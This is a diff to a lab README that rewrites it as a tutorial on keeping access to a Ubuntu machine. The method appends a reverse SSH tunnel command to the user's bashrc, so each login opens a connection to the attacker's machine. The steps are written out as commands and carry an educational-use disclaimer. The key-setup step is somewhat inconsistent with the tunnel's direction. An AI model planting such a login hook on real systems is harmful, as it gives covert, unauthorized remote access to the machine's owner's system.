@@ -1,10 +1,25 @@
 # Introduction
-This is my audition to be considered for future PluralSight lab creation activities.
+Welcome to the world of advanced penetration testing, where we will embark on a thrilling journey of maintaining access using bash to create a reverse SSH shell. In this tutorial, we will exploit the bashrc file of a user on the target machine to gain remote access from another location. Get ready to sharpen your skills and master the art of hacking with two Ubuntu machines at your disposal - one serving as the target and the other as the attacking machine.
 
-# Environment Setup Notes
-If you're attempting to duplicate this in your local environment, you'll need one Ubuntu 20.04 Console that runs the XXXXXXXX.sh script and one Ubuntu 20.04 Desktop that runs the XXXXCONNECT.sh script. The Desktop machine needs to have the 192.168.5.99 IP address. The Console machine needs to have the 192.168.5.100 IP address. If they're not already preconfigured to do so, you'll also need to make sure port 54321 is open. 
-Ideally the machines and associated files would be created and provided using Terraform and scripts. 
+# Lab Requirements
+- Two Ubuntu machines, ready to be compromised
+- An SSH client
+- A user account with permission to edit the user's bashrc file on the system being targeted
+
+# Environment Setup
+- Establish a network connection between the two Ubuntu machines
+- Confirm communication between the machines via ping
+- Ensure that the attackers SSH server is running and properly configured 
 
 # Learner Instructions
-You will need to follow along in the Lab Instructions we've provided in this repo. They should be run from the Ubuntu 20.04 Desktop machine you have set up.
-Please feel free to reach out if you have any questions!
+1. On the attacking machine, open the terminal and execute the following command: **`ssh-keygen -t rsa`**. This command will generate a public-private key pair, the key to unlocking the target machine.
+2. Utilize the following command to copy the public key from the attacking machine to the target machine: **`ssh-copy-id <username>@<target_machine_IP>`**. Replace **`<username>`** with the username of the user account on the target machine and **`<target_machine_IP>`** with the IP address of the target machine, slipping past security undetected.
+3. On the target machine, open the user's bashrc file by executing the command: **`nano ~/.bashrc`**. This command will open the nano text editor and display the contents of the bashrc file, providing the opportunity to plant the reverse shell.
+4. Append the following line to the end of the file: **`ssh -f -N -R 2222:localhost:22 <username>@<attacker_machine_IP>`**. Replace **`<username>`** with the username of the user account on the attacker machine and **`<attacker_machine_IP>`** with the IP address of the attacker machine, setting the trap.
+5. Save and close the bashrc file by executing **`Ctrl + X`**, then **`Y`**, then **`Enter`**, sealing the deal.
+6. Logout and login again or execute the command **`source ~/.bashrc`**, activating the reverse shell.
+7. From the attacking machine, use the following command to connect to the target machine: **`ssh -p 2222 <username>@localhost`**, gaining access to the target machine.
+
+By following these steps, a reverse SSH shell should now be established on the target machine. This grants remote access using the command **ssh -p 2222 <username>@localhost**. 
+
+Disclaim: Keep in mind that this tutorial is intended for educational purposes only and such techniques should be employed with the permission of someone that proper authorization to do so. 
